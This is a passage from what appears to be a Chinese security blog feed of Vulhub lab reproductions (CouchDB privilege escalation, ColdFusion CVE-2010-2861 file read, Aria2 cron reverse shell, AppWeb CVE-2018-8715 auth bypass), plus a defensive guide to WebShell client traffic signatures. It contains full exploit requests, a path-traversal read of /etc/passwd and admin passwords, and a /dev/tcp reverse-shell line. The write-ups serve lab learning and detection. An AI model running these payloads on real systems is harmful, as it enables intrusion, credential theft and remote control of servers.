<li><a href="https://www.exploit-db.com/exploits/44498" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44498</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4716.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/4716.html</a></li>
</ul>
<p>环境启动后，浏览<code>http://192.168.44.132:5984/_utils/</code>到一个网页，说明Couchdb已经启动成功。但是没有身份验证，您什么也做不了。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>这是添加用户的正常请求。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;_users&#x2F;org.couchdb.user:vulhub HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:5984</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 90</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;vulhub&quot;,</span><br><span class="line">  &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">  &quot;password&quot;: &quot;vulhub&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回了 403 错误：<code>{&quot;error&quot;: &quot;forbidden&quot;, &quot;reason&quot;: &quot;Only _admin may set roles&quot;}</code>，这意味着只有管理员可以使用端点。</p>
<p><img src="https://image.3001.net/images/20210702/16251991056980.png" alt="image-20210702120637358"></p>
<p>通过发送包含重复<strong>roles</strong>的请求来绕过限制。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;_users&#x2F;org.couchdb.user:vulhub HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:5984</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 108</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;vulhub&quot;,</span><br><span class="line">  &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">  &quot;roles&quot;: [],</span><br><span class="line">  &quot;password&quot;: &quot;vulhub&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功创建了一个用户<code>vulhub</code>，有密码<code>vulhub</code>。</p>
<p><img src="https://image.3001.net/images/20210702/16251991083767.png" alt="image-20210702120819383"></p>
<p>登录成功。</p>
<p><img src="https://image.3001.net/images/20210702/16251991293917.png" alt="image-20210702120939566"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Apache Couchdb</tag>
      </tags>
  </entry>
  <entry>
    <title>WebShell客户端流量特征</title>
    <url>/2021/05/18/Webshell%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81/</url>
    <content><![CDATA[<h1 id="WebShell客户端流量特征"><a href="#WebShell客户端流量特征" class="headerlink" title="WebShell客户端流量特征"></a>WebShell客户端流量特征</h1><p>WebShell客户端是一种用于服务器上WebShell后门与攻击客户端之间进行通信的程序，通常可以根据WebShell客户端的流量来判断服务器上是否存在WebShell后门。</p>
<a id="more"></a>

<h2 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h2><p>中国菜刀自诞生以来已经历了多个版本的更新，其功能、隐秘性也随着更新得到很大提升。菜刀现在主流有三个版本在使用，分别为2011版、2014版、2016版，这三个版本中从2011版本到2014版本是功能性上进行了增强，从2014版本到2016版本是在隐秘性上进行了增强，2016版本的菜刀流量加入了混淆，使其链接流量更具有混淆性。</p>
<p>中国菜刀基本支持PHP、JSP、ASP这三种WebShell的连接，这三种语言所对应的流量各有差异，各个版本也有不用。下面将按照不同版本不同语言组合进行分析。其中2011版和2014版菜刀流量特征基本一致，所以放在一起分析。</p>
<h3 id="中国菜刀2011版本及2014版本各语言WebShell链接流量特征"><a href="#中国菜刀2011版本及2014版本各语言WebShell链接流量特征" class="headerlink" title="中国菜刀2011版本及2014版本各语言WebShell链接流量特征"></a>中国菜刀2011版本及2014版本各语言WebShell链接流量特征</h3><h4 id="1-PHP类WebShell链接流量"><a href="#1-PHP类WebShell链接流量" class="headerlink" title="(1)PHP类WebShell链接流量"></a>(1)PHP类WebShell链接流量</h4><p>其中特征主要在body中，将body中流量进行url解码后如下：</p>
<p>其中特征点有如下三部分，</p>
<p>第一：“eval”，eval函数用于执行传递的攻击payload，这是必不可少的；</p>
<p>第二：(base64_decode($_POST[z0]))，(base64_decode($_POST[z0]))将攻击payload进行Base64解码，因为菜刀默认是将攻击载荷使用Base64编码，以避免被检测；</p>
<p>第三：&amp;z0=QGluaV9zZXQ…，该部分是传递攻击payload，此参数z0对应$_POST[z0]接收到的数据，该参数值是使用Base64编码的，所以可以利用base64解码可以看到攻击明文。</p>
<p>注：</p>
<p>1.有少数时候eval方法会被assert方法替代。</p>
<p>2.$_POST也会被$_GET、$_REQUEST替代。</p>
<p>3.z0是菜刀默认的参数，这个地方也有可能被修改为其他参数名。</p>
<h4 id="2-JSP类WebShell链接流量："><a href="#2-JSP类WebShell链接流量：" class="headerlink" title="(2)JSP类WebShell链接流量："></a>(2)JSP类WebShell链接流量：</h4><p>该流量是WebShell链接流量的第一段链接流量，其中特征主要在i=A&amp;z0=GB2312，菜刀链接JSP木马时，第一个参数定义操作，其中参数值为A-Q，如i=A，第二个参数指定编码，其参数值为编码，如z0=GB2312，有时候z0后面还会接着又z1=参数用来加入攻击载荷。</p>
<p>注：其中参数名i、z0、z1这种参数名是会变的，但是其参数值以及这种形式是不会变得，最主要就是第一个参数值在A-Q，这种是不变的。</p>
<h4 id="3-ASP类WebShell链接流量："><a href="#3-ASP类WebShell链接流量：" class="headerlink" title="(3)ASP类WebShell链接流量："></a>(3)ASP类WebShell链接流量：</h4><p>其中body流量进行URL解码后</p>
<p>其中特征点有如下三部分，</p>
<p>第一：“Execute”，Execute函数用于执行传递的攻击payload，这是必不可少的，这个等同于php类中eval函数；</p>
<p>第二：OnError ResumeNext，这部分是大部分ASP客户端中必有的流量，能保证不管前面出任何错，继续执行以下代码。</p>
<p>第三：Response.Write和Response.End是必有的，是来完善整个操作的。</p>
<p>这种流量主要识别这几部分特征，在正常流量中基本没有。</p>
<p>注：OnError Resume Next这个特征在大部分流量中存在，极少数情况没有。</p>
<h3 id="中国菜刀2016版本各语言WebShell链接流量特征"><a href="#中国菜刀2016版本各语言WebShell链接流量特征" class="headerlink" title="中国菜刀2016版本各语言WebShell链接流量特征"></a>中国菜刀2016版本各语言WebShell链接流量特征</h3><h4 id="1-PHP类WebShell链接流量-1"><a href="#1-PHP类WebShell链接流量-1" class="headerlink" title="(1)PHP类WebShell链接流量"></a>(1)PHP类WebShell链接流量</h4><p>其中特征主要在body中，将body中部分如下：</p>
<p>这个版本中流量最大的改变就是将特征进行打断混淆，这也给我们识别特征提供一种思路。</p>
<p>其中特征点有如下三部分，</p>
<p>第一：“”Ba”.”SE6”.”4_dEc”.”OdE”，这部分是将base64解码打断使用.来连接。</p>
<p>第二：@ev”.”al，这部分也是将@eval这部分进行打断连接，可以识别这段代码即可。</p>
<p>第三：QGluaV9zZXQoImRpc3BsYXlf…，该部分是传递攻击payload，payload依旧使用Base64编码的，所以可以利用base64解码可以看到攻击明文来识别。</p>
<p>注：1.有少数时候eval方法会被assert方法替代。</p>
<h4 id="2-JSP类WebShell链接流量：-1"><a href="#2-JSP类WebShell链接流量：-1" class="headerlink" title="(2)JSP类WebShell链接流量："></a>(2)JSP类WebShell链接流量：</h4><p>该版本JSPwebshell流量与之前版本一样，</p>
<p>所以分析如上：该流量是WebShell链接流量的第一段链接流量，其中特征主要在i=A&amp;z0=GB2312，菜刀链接JSP木马时，第一个参数定义操作，其中参数值为A-Q，如i=A，第二个参数指定编码，其参数值为编码，如z0=GB2312，有时候z0后面还会接着又z1=、z2=参数用来加入攻击载荷。</p>
<p>注：其中参数名i、z0、z1这种参数名是会变的，但是其参数值以及这种形式是不会变得，最主要就是第一个参数值在A-Q，这种是不变的。</p>
<h4 id="3-ASP类WebShell链接流量：-1"><a href="#3-ASP类WebShell链接流量：-1" class="headerlink" title="(3)ASP类WebShell链接流量："></a>(3)ASP类WebShell链接流量：</h4><p>其中body流量为：</p>
<p>2016版本流量这链接流量最大的变化在于body中部分字符被unicode编码替换混淆，所以这种特征需要提取出一种形式来，匹配这个混淆特征，比如“字符+%u0000+字符+%u0000”这种形式来判断该流量。</p>
<p>或者直接将这部分代码直接进行unicode解码，可以获取到如2011或2014版本的asp所示的流量。可以根据上一段特征来进行判断。</p>
<p>这种流量主要识别这几部分特征，在正常流量中基本没有。</p>
<h2 id="中国蚁剑-AntSword"><a href="#中国蚁剑-AntSword" class="headerlink" title="中国蚁剑(AntSword)"></a>中国蚁剑(AntSword)</h2><p>蚁剑的很多代码源于中国菜刀，所以他的链接流量与中国菜刀很相似，但是蚁剑可以扩充性很好，可以对进行加密、混淆等绕过处理。蚁剑默认支持ASP以及PHP的webshell链接。</p>
<h3 id="蚁剑PHP类WebShell链接流量"><a href="#蚁剑PHP类WebShell链接流量" class="headerlink" title="蚁剑PHP类WebShell链接流量"></a>蚁剑PHP类WebShell链接流量</h3><p>其中body流量进行URL解码后为：</p>
<p>其中流量最中明显的特征为@ini_set(“display_errors”,”0”);这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码，但是有的客户端会将这段编码或者加密，而蚁剑是明文，所以较好发现。</p>
<h3 id="蚁剑ASP类WebShell链接流量"><a href="#蚁剑ASP类WebShell链接流量" class="headerlink" title="蚁剑ASP类WebShell链接流量"></a>蚁剑ASP类WebShell链接流量</h3><p>其中body流量进行URL解码后为：</p>
<p>我们可以看出蚁剑针对ASP类的WebShell流量与菜刀的流量很像，其中特征也是相同，如OnError ResumeNext、Response.End、Response.Write，其中execute在蚁剑中被打断混淆了，变成了拼接形式Ex”&amp;cHr(101)&amp;”cute，同时该流量中也使用了eval参数，可以被认为明显特征。</p>
<h3 id="蚁剑绕过特征流量"><a href="#蚁剑绕过特征流量" class="headerlink" title="蚁剑绕过特征流量"></a>蚁剑绕过特征流量</h3><p>由于蚁剑中包含了很多加密、绕过插件，所以导致很多流量被加密后无法识别，但是蚁剑混淆加密后还有一个比较明显的特征，即为参数名大多以“_0x……=”这种形式（下划线可替换为其他）</p>
<p>所以，以_0x开头的参数名，后面为加密数据的数据包也可识别为蚁剑的流量特征。</p>
<h2 id="冰蝎（Behinder）"><a href="#冰蝎（Behinder）" class="headerlink" title="冰蝎（Behinder）"></a>冰蝎（Behinder）</h2><h3 id="弱特征1：密钥传递时URL参数"><a href="#弱特征1：密钥传递时URL参数" class="headerlink" title="弱特征1：密钥传递时URL参数"></a>弱特征1：密钥传递时URL参数</h3><p>密钥传递时，URI只有一个参数，key-value型参数，只有一个参数。Key是黑客给shell设置的密码，一般为10位以下字母和数字，很少有人设置特殊字符做一句话密码的（少数情况我们不考虑）。而Value一般是2至3位随机纯数字。</p>
<p>另外webshell的扩展名一般为可执行脚本，因此正则为</p>
<blockquote>
<p>\.(php|jsp|asp|jspx|asa)?(\w){1,10}=\d{2,3}HTTP/1.1</p>
</blockquote>
<h3 id="弱特征2：加密时的URL参数"><a href="#弱特征2：加密时的URL参数" class="headerlink" title="弱特征2：加密时的URL参数"></a>弱特征2：加密时的URL参数</h3><p>在加密通讯过程中，没有URL参数。是的，没有参数本身也是一种特征。</p>
<blockquote>
<p>\.(php|jsp|asp|jspx|asa) HTTP/1.1    </p>
</blockquote>
<h3 id="强特征3：Accept字段（可绕过）"><a href="#强特征3：Accept字段（可绕过）" class="headerlink" title="强特征3：Accept字段（可绕过）"></a>强特征3：Accept字段（可绕过）</h3><p>Accept是HTTP协议常用的字段，但冰蝎默认Accept字段的值却很特殊，我也没有想明白为什么要设置这么一个奇怪的值。这个特征存在于冰蝎的任何一个通讯阶段。</p>
<blockquote>
<p>Accept: text/html,image/gif, image/jpeg, <em>; q=.2, */</em>; q=.2    </p>
</blockquote>
<p>冰蝎支持自定义HTTP Header，因此该特征可以被绕过。</p>
<h3 id="强特征4：UserAgent字段（可绕过）"><a href="#强特征4：UserAgent字段（可绕过）" class="headerlink" title="强特征4：UserAgent字段（可绕过）"></a>强特征4：UserAgent字段（可绕过）</h3><p>冰蝎内置了十余种UserAgent，每次连接shell会随机选择一个进行使用。</p>
<p>以下UserAgent列表是从冰蝎的jar包中提取的，可见大多是比较早的浏览器，现在很少有人使用。而且有些国产浏览器甚至精确到了小版本，众所周知，很多国产浏览器是默认自动更新，正常用户很少用过早的版本，因此可以作为强特征使用。</p>
<p>列表中有少量标红的UserAgent，目前用户量较大，不可作为强特征。</p>
<p>如果发现历史流量中同一个源IP访问某个URL时，命中了以下列表中多个UserAgent，那基本确认就是冰蝎了。</p>
<blockquote>
<p>​        Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1(KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1    </p>
<p>​        Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0)Gecko/20100101 Firefox/6.0    </p>
<p>​        Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.50(KHTML, like Gecko) Version/5.1 Safari/534.50 “ BOpera/9.80 (Windows NT6.1; U; zh-cn) Presto/2.9.168 Version/11.5    </p>
<p>​        Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64;x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; Tablet PC 2.0; .NET4.0E)    </p>
<p>​        Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64;Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;Media Center PC 6.0; .NET4.0C; InfoPath.3)    </p>
<p>​        Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1;Trident/4.0; GTB7.0)    </p>
<p>​        Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1) , 7    </p>
<p>​        Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)    </p>
<p>​        Mozilla/5.0 (Windows; U; Windows NT 6.1; )AppleWebKit/534.12 (KHTML, like Gecko) Maxthon/3.0 Safari/534.12    </p>
<p>​        Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64;Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)    </p>
<p>​        Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64;Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)    </p>
<p>​        Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US)AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.33 Safari/534.3 SE 2.XMetaSr    </p>
<p>​        Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64;Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)    </p>
<p>​        Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML,like Gecko) Chrome/13.0.782.41 Safari/535.1 QQBrowser/6.9.11079.20    </p>
<p>​        Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64;Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E) QQBrowser/6.9.11079    </p>
<p>​        Mozilla/5.0 (compatible; MSIE 9.0; WindowsNT 6.1; WOW64; Trident/5.0)    </p>
</blockquote>
<p>同样，UserAgent可由攻击者自定义，因此该特征可能会被绕过。</p>
<h3 id="强特征5：传递的密钥"><a href="#强特征5：传递的密钥" class="headerlink" title="强特征5：传递的密钥"></a>强特征5：传递的密钥</h3><p>加密所用密钥是长度为16的随机字符串，小写字母+数字组成。密钥传递阶段，密钥存在于Response Body中，如图。</p>
<p><img src="https://image.3001.net/images/20210518/16213076877070.png" alt="image-20210518110608496"></p>
<p>因此密钥特征如下：</p>
<blockquote>
<p>\r\n\r\n[a-z0-9]{16}$    </p>
</blockquote>
<p>如果不想使用正则，可使用字符串特征，误报会更多。</p>
<blockquote>
<p>Content-Length: 16    </p>
</blockquote>
<h3 id="弱特征6：加密数据上行"><a href="#弱特征6：加密数据上行" class="headerlink" title="弱特征6：加密数据上行"></a>弱特征6：加密数据上行</h3><p>在加密通讯时，php/jsp shell会提交base64编码后的数据。用如下正则便可以很好的匹配。</p>
<blockquote>
<p>\r\n\r\n[a-zA-Z\d+/]{<strong>20</strong>,}    </p>
</blockquote>
<p>注意这条正则最后的数字20，意思是指定的字符出现至少20个才会匹配。而要匹配这段数据长度至少有几K，在TCP层，如此长的数据不会一次性发送，而是拆分成若干“帧”，逐个发送。工作于4层的IDS只能检测“帧”，而“帧”的长度是不确定的（帧的长度是根据网络情况动态调整的），因此这里保守地只写了20。如果你的IDS工作于七层，可以拼接HTTP完整请求的话，这个值可适当增加，以减少误报。</p>
<h3 id="弱特征7：加密数据下行"><a href="#弱特征7：加密数据下行" class="headerlink" title="弱特征7：加密数据下行"></a>弱特征7：加密数据下行</h3><p>该特征同样存在于加密通讯时，在ResponseBody中的数据是加密后的二进制数据。</p>
<p>如何用正则去匹配二进制数据呢？这里我使用的方法未必是最好的，仅供大家参考。二进制数据中必然有大量不可见的字符，当然也有不少可见字符，它们出现的位置是随机的。如果第一个位置是可见字符，那么之后的6个字符之内有很大概率出现不可见字符。匹配不可见字符使用零宽负行断言的方式，即不认识的字符即为不可见字符。为了增加准确性，本条策略里扩展了“不可见字符”的定义，这里认为的不可见字符，除了“无法显示的字符”之外，还加入了HTML/JSONP中不常见的字符</p>
<blockquote>
<p>\r\n\r\n[\w]{0,6}\w\s&gt;&lt;=-‘“/.:;,!(){}+    </p>
</blockquote>
<p>如果用户加载图片/视频等多媒体二进制文件的话也是会引发误报，因此我们再写一条策略，规定MIME类型为html。</p>
<blockquote>
<p>Content-Type: text/html    </p>
</blockquote>
<p>这两条规则是“且”的关系。意思是如果发现text/html类型的文档是二进制的，那么它就是可疑的。</p>
<p>需要注意的是，并不是所有正则引擎都支持“断言”模型。在使用本策略之前，请确认你使用的正则引擎支持断言，并进行严格测试。</p>
<h3 id="弱特征8：长连接（可绕过）"><a href="#弱特征8：长连接（可绕过）" class="headerlink" title="弱特征8：长连接（可绕过）"></a>弱特征8：长连接（可绕过）</h3><p>冰蝎通讯默认使用长连接，避免了频繁的握手造成的资源开销。因此默认情况下，请求头和响应头里都会带有:</p>
<blockquote>
<p>Connection: Keep-Alive    </p>
</blockquote>
<p>这个特征存在于冰蝎的任何一个通讯阶段。</p>
]]></content>
      <categories>
        <category>Webshell</category>
      </categories>
      <tags>
        <tag>Webshell</tag>
        <tag>特征分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Adobe ColdFusion目录遍历漏洞（CVE-2010-2861）</title>
    <url>/2021/05/13/Adobe%20ColdFusion%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2010-2861%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Adobe-ColdFusion目录遍历漏洞（CVE-2010-2861）"><a href="#Adobe-ColdFusion目录遍历漏洞（CVE-2010-2861）" class="headerlink" title="Adobe ColdFusion目录遍历漏洞（CVE-2010-2861）"></a>Adobe ColdFusion目录遍历漏洞（CVE-2010-2861）</h1><a id="more"></a>

<p>Adobe ColdFusion是由JJ Allaire于1995年创建的商业快速Web应用程序开发计算平台。</p>
<p>Adobe ColdFusion 9.0.1和更早版本中存在一个目录遍历漏洞，该漏洞使远程攻击者可以通过以下区域设置参数来读取任意文件：（1）CFIDE / administrator / settings / mappings.cfm，（2）logging / settings.cfm ，（3）datasources / index.cfm，（4）j2eepackaging / editarchive.cfm和（5）CFIDE / administrator /中的enter.cfm。</p>
<p>访问<code>http://192.168.44.132:8500/CFIDE/administrator/enter.cfm</code>以查看初始化页面，输入密码<code>admin</code>以初始化整个服务器。</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p><code>/etc/passwd</code>通过读取文件<code>http://192.168.44.132:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</code>：</p>
<p><img src="https://image.3001.net/images/20210518/16213153111158.png" alt="image-20210518114929507"></p>
<p>通过<code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en</code>以下方式读取后台管理员密码：</p>
<p><img src="https://image.3001.net/images/20210518/16213153151585.png" alt="image-20210518115112569"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Adobe ColdFusion</tag>
      </tags>
  </entry>
  <entry>
    <title>Aria2任意文件写入漏洞</title>
    <url>/2021/05/07/Aria2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Aria2任意文件写入漏洞"><a href="#Aria2任意文件写入漏洞" class="headerlink" title="Aria2任意文件写入漏洞"></a>Aria2任意文件写入漏洞</h1><a id="more"></a>

<p>Aria2是具有内置XML-RPC和JSON-RPC接口的轻型，多协议，多源下载工具（支持HTTP / HTTPS，FTP，BitTorrent，Metalink）。</p>
<p>我们可以使用RPC接口操作aria2并将文件下载到任何目录，从而导致任意文件写入漏洞。</p>
<p>参考文章：</p>
<ul>
<li><a href="https://paper.seebug.org/120/" target="_blank" rel="noopener">https://paper.seebug.org/120/</a></li>
</ul>
<p>6800是aria2的rpc服务的默认端口。启动环境后，访问<code>http://192.168.44.132:6800/</code>，该服务应返回404页面。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>由于rpc通信需要json或xml，因此不方便，因此我们可以使用第三方UI与目标进行通信，例如<a href="http://binux.github.io/yaaw/demo/" target="_blank" rel="noopener">http://binux.github.io/yaaw/demo/</a></p>
<p>打开yaaw，单击配置按钮，然后填写运行aria2：的目标域名<code>http://192.168.44.132:6800/jsonrpc</code>：</p>
<p><img src="https://image.3001.net/images/20210507/16203724065182.png" alt="image-20210507141248015"></p>
<p>然后单击“添加+”以添加新的下载任务。在“目录”（Dir）字段中填写要下载文件的目录，并在“文件名”（File Name）字段中填写所需的文件名。例如，我们将通过编写crond任务来下载反向外壳程序：</p>
<p><img src="https://image.3001.net/images/20210507/16203724093869.png" alt="image-20210507142313216"></p>
<p>shell文件，末尾需要一个换行符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash </span><br><span class="line">&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.44.1&#x2F;4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>此时，arai2会将恶意文件（您指定的URL）下载到/etc/cron.d/目录中，文件名为“ shell”。在debian中，/ etc / cron.d目录中的所有文件都将作为计划任务配置文件（如crontab）读取。编写完成后，我们必须等待一分钟，然后执行反向Shell脚本：</p>
<p><img src="https://image.3001.net/images/20210507/16203724165984.png" alt="image-20210507145553962"></p>
<p>可以看到上传成功了。</p>
<blockquote>
<p>如果反向Shell不成功，请注意crontab文件的格式，并且换行符必须为<code>\n</code>，并且在文件末尾需要换行符。</p>
</blockquote>
<p>反弹shell成功，</p>
<p><img src="https://image.3001.net/images/20210507/16203724192538.png" alt="image-20210507151842393"></p>
<p>注意一点，shell脚本执行报“/bin/bash^M: bad interpreter: No such file or directory”这样的错，是因为在执行shell脚本时提示这样的错误主要是由于shell脚本文件是dos格式，即每一行结尾以\r\n来标识，而unix格式的文件行尾则以\n来标识。</p>
<p>查看脚本文件是dos格式还是unix格式的几种办法。<br>（1）cat -A filename  从显示结果可以判断，dos格式的文件行尾为^M$，unix格式的文件行尾为$。<br>（2）od -t x1 filename 如果看到输出内容中存在0d 0a的字符，那么文件是dos格式，如果只有0a，则是unix格式。<br>（3）vi filename打开文件，执行 : set ff，如果文件为dos格式在显示为fileformat=dos，如果是unxi则显示为fileformat=unix。</p>
<p>  解决方法：<br>（1）使用linux命令dos2unix filename，直接把文件转换为unix格式<br>（2）使用sed命令sed -i “s/\r//“ filename  或者 sed -i “s/^M//“ filename直接替换结尾符为unix格式<br>（3）vi filename打开文件，执行 : set ff=unix 设置文件为unix，然后执行:wq，保存成unix格式。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Aria2</tag>
      </tags>
  </entry>
  <entry>
    <title>AppWeb身份验证绕过漏洞（CVE-2018-8715）</title>
    <url>/2021/05/06/AppWeb%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-8715%EF%BC%89/</url>
    <content><![CDATA[<h1 id="AppWeb身份验证绕过漏洞（CVE-2018-8715）"><a href="#AppWeb身份验证绕过漏洞（CVE-2018-8715）" class="headerlink" title="AppWeb身份验证绕过漏洞（CVE-2018-8715）"></a>AppWeb身份验证绕过漏洞（CVE-2018-8715）</h1><a id="more"></a>

<p>AppWeb是基于Embedthis Software LLC开发和维护的开源GPL协议的嵌入式Web服务器。它是用C / C ++编写的，几乎可以在任何现代操作系统上运行。当然，它旨在为嵌入式设备提供Web应用程序容器。</p>
<p>可以配置AppWeb进行身份验证，其中包括以下三种身份验证方法：</p>
<ul>
<li><code>basic</code>，传统的HTTP基本身份验证</li>
<li><code>digest</code>，改进了HTTP基本身份验证。在这种模式下，Cookie将用于身份验证，而不是<code>Authorization</code>标头。</li>
<li><code>form</code>，基于HTML的表单身份验证</li>
</ul>
<p>在7.0.3之前的Appweb版本中，存在与authCondition函数相关的逻辑缺陷<code>http/httpLib.c</code>。使用伪造的HTTP请求，可以绕过<code>form</code>和<code>digest</code>登录类型的身份验证。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://ssd-disclosure.com/index.php/archives/3676" target="_blank" rel="noopener">https://ssd-disclosure.com/index.php/archives/3676</a></li>
</ul>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>访问<code>http://192.168.44.132:8080/</code>，出现登陆框提示需要登录，删除凭证后，放包可发现存在管理员的session值直接响应包返回，利用该漏洞需要知道一个已存在的用户名，当前的用户名是<code>admin</code>，因此您可以使用以下请求绕过身份验证：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Authorization: Digest username&#x3D;&quot;admin&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.93 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>由于我们没有传递密码字段，因此服务器错误发生，其中包含<code>200 status code</code>和会话设置标头：</p>
<p><img src="https://image.3001.net/images/20210507/16203566614610.png" alt="image-20210507104525967"></p>
<p>可以使用以下会话标头正常访问该页面：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-http-session-&#x3D;7::http.session::665137a0fea794484d8c255fa9f8f683</span><br></pre></td></tr></table></figure>

<p>在将session添加到请求包内，以POST的方式发送，然后这样就可以直接访问该管理员才能访问的界面了。</p>
<p><img src="https://image.3001.net/images/20210507/16203566642567.png" alt="image-20210507104657138"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>AppWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>Apereo CAS 4.1反序列化RCE漏洞</title>
    <url>/2021/05/01/Apereo%20CAS%204.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/</url>
